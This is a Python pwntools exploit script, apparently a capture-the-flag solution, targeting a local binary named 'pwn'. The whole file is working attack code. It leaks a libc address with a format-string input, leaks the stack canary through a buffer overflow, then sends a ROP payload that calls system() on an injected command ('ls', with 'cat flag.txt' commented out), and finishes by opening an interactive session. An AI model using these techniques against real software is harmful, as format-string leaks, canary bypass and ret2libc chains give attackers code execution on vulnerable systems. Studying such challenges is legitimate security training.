#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2018-08-29 09:32:13
# @Author  : giantbranch (giantbranch@gmail.com)
# @Link    : http://www.giantbranch.cn/
# @tags : 

from pwn import *

context.log_level = "debug"
p = process("./pwn")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
local_libc_offset = 3954339

elf = ELF("./pwn")

plt_puts = elf.symbols['puts']
got_puts = elf.got['puts']

plt_read = elf.symbols['read']
plt_open = elf.symbols['open']

def getpid():
    print proc.pidof(p)[0]
    pause()


def overflow_1(buf):
    p.recvuntil("Guess your option:")
    p.send("1")
    p.recvuntil("Oh,man.Play with the stack is really dangerous,so u can only play once..\n")
    p.send(buf)

def secret():
    p.recvuntil("Guess your option:")
    p.send("9011")
    p.recvuntil("Input your secret code:")
    p.send("1234")

def rao_secret():
    p.recvuntil("Guess your option:")
    p.send("9011")
    p.recvuntil("Input your secret code:")
    p.send(p64(0x0))

def canary():
    p.recvuntil("boring to make u more bored...\n")
    p.send("buf")
    p.recvuntil("Satisfied?y/n\n")
    p.send("n")

def sub_400999(payload):
    p.recvuntil("Guess your option:")
    p.send("2")
    p.recvuntil("boring to make u more bored...\n")
    p.send(payload)
    p.recvuntil("Satisfied?y/n\n")
    p.send("y")

def op3_getlibc():
    p.recvuntil("Guess your option:")
    p.send("3")
    p.recvuntil("leak the secret code I think?)\n")
    p.send("%a")
    p.recvuntil("0x0.0")
    tmp = p.recvuntil("-")[:-2]
    #print repr(tmp)
    libc_addr = int(tmp, 16)
    
    return libc_addr

# overflow_1("A" * 0x110)
overflow_func2 = 0x4008A3

# 0x0000000000400c53 : pop rdi ; ret
pop_rdi_ret = 0x0000000000400c53
# 0x0000000000400c51 : pop rsi ; pop r15 ; ret
pop_rsi_ret = 0x0000000000400c51

# leak libc
libc_addr = op3_getlibc()
print "libc_addr = " + hex(libc_addr)
# 计算system和/bin/sh的地址
print "\ncalculating system() addr and \"/bin/sh\" addr ... ###"
system_addr = libc_addr - local_libc_offset + libc.symbols['system']
print "system_addr = " + hex(system_addr)



p.recvuntil("Guess your option:")
p.send("2")
for x in xrange(0,4):
    canary()

p.recvuntil("boring to make u more bored...\n")
p.send("A" * 0x70 + "ls")
# p.send("A" * 0x70 + "cat flag.txt")
p.recvuntil("Satisfied?y/n\n")
p.send("y")

# leak canary
overflow_1("A"*165 + "BBBB")
p.recvuntil("BBBB")
can = u64("\x00" + p.recv(7))
print "canary = " + hex(can)
rbp = 0x603000

cmd = 0x6020f0
payload = "A" * 8 + p64(can) + p64(rbp) + p64(pop_rdi_ret) + p64(cmd) + p64(system_addr)
# print len(payload)
# pause()
sub_400999(payload) 

for x in xrange(0,1100):
    secret()

getpid()

rao_secret()
# p.recvuntil("Close ur mouth...\n")
# puts_addr = u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
# # print "puts_addr = " + hex(puts_addr) 

# p.recvuntil("make u more bored...\n")


p.interactive()
